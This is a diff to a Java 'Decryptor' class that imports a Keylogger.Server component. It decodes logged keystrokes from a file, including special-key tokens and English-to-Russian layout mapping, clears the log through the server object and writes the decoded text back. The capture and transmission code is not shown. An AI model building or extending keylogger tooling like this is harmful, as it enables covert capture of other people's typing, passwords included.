@@ -1,5 +1,7 @@
 package FileReader;
 
+import Keylogger.Server;
+
 import java.io.*;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -8,10 +10,11 @@ import java.util.Collections;
 public class Decryptor {
     static String[] keys = {"[alt]", "[tab]", "[shift]", "[escape]", "[backspace]", "[caps lock]", "[ctrl", "Win]", "[backslash]", "[up]", "[down]", "[right]", "[left]"};
 
-    static String[] english = "q w e r t y u i o p [ ] a s d f g h j k l ; ' z x c v b n m , .".split(" ");
-    static String[] russian = "й ц у к е н г ш щ з х ъ ф ы в а п р о л д ж э я ч с м и т ь б ю".split(" ");
+    static String[] english = "q w e r t y u i o p [ ] a s d f g h j k l ; ' z x c v b n m , . `".split(" ");
+    static String[] russian = "й ц у к е н г ш щ з х ъ ф ы в а п р о л д ж э я ч с м и т ь б ю ё".split(" ");
 
     public static void main(String[] args) {
+        Server server = new Server();
         try {
             File myFile = new File("test.txt");
             FileReader fileReader = new FileReader(myFile);
@@ -27,12 +30,35 @@ public class Decryptor {
             }
             String language = lines[0].substring(0, 2);
             String object = optimization(lines);
-            object.trim();
-            translation(language, object);
+            object = object.trim();
+            ArrayList<String> listOFWords;
+            listOFWords = translation(language, object);
+            object = "";
+            for (int i = 0; i < listOFWords.size(); i++){
+                if (listOFWords.get(i).equals(""))
+                    continue;
+
+                if (listOFWords.get(i).equals("\n")) {
+                    object += '\n';
+                    continue;
+                }
+
+                if (listOFWords.size() > i + 1 && listOFWords.get(i + 1).equals("\n")){
+                    object += listOFWords.get(i);
+                    continue;
+                }
+
+
+                object += listOFWords.get(i) + " ";
+            }
+            object = object.trim();
+            server.clearTheFile();
+            fileWriter(object);
+
         } catch (FileNotFoundException e) {
-            e.printStackTrace();
+            System.out.println("Файл не найден");
         } catch (IOException e) {
-            e.printStackTrace();
+            System.out.println("Произошла ошибка во время чтения файла");;
         }
     }
 
@@ -59,7 +85,7 @@ public class Decryptor {
         return main;
     }
 
-    public static void translation(String language, String object) {
+    public static ArrayList<String> translation(String language, String object) {
         String[] slices = object.split("\n");
         ArrayList<String> s = new ArrayList<>();
         for (int i = 0; i < slices.length; i++) {
@@ -92,6 +118,15 @@ public class Decryptor {
             s.add("\n");
         }
         s.remove(s.size() - 1);
-        System.out.println(s);
+        return s;
+    }
+    public static void fileWriter(String object){
+        try{
+            FileWriter writer = new FileWriter("test.txt");
+            writer.write(object);
+            writer.close();
+        } catch (IOException e) {
+            System.out.println("ошибка во времени записи файла");;
+        }
     }
 }
